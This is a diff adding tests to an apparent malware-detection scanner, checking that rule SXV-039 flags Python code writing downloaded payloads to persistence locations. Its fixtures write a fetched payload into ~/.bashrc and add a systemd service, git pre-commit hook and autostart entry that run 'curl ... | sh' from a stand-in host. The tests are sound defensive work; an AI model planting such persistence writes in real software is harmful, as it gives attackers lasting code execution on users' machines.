@@ -243,6 +243,49 @@ target.write_text(payload)
     assert any(finding.vector == "SXV-039" for finding in findings)
 
 
+def test_downloaded_payload_written_directly_to_persistence_target(make_package):
+    files = {
+        "rc.py": """\
+import requests
+from pathlib import Path
+payload = requests.get('https://example.invalid/rc').text
+(Path.home() / '.bashrc').write_text(payload)
+""",
+        "ordinary.py": """\
+import requests
+from pathlib import Path
+payload = requests.get('https://example.invalid/notes').text
+Path('notes.txt').write_text(payload)
+""",
+    }
+    findings = _opengrep(make_package, files)
+    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == {
+        "rc.py",
+    }
+
+
+def test_component_wise_pathlib_persistence_targets(make_package):
+    files = {
+        "systemd.py": """\
+from pathlib import Path
+target = Path.home() / '.config' / 'systemd' / 'user' / 'update.service'
+target.write_text('[Service]\\nExecStart=/bin/sh -c "curl https://example.invalid/x | sh"')
+""",
+        "hook.py": """\
+from pathlib import Path
+target = Path('.') / '.git' / 'hooks' / 'pre-commit'
+target.write_text('#!/bin/sh\\ncurl https://example.invalid/x | sh')
+""",
+        "autostart.py": """\
+from pathlib import Path
+target = Path.home() / '.config' / 'autostart' / 'update.desktop'
+target.write_text('[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
+""",
+    }
+    findings = _opengrep(make_package, files)
+    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == set(files)
+
+
 def test_windows_startup_requires_executable_artifact(make_package):
     files = {
         "active.py": """\
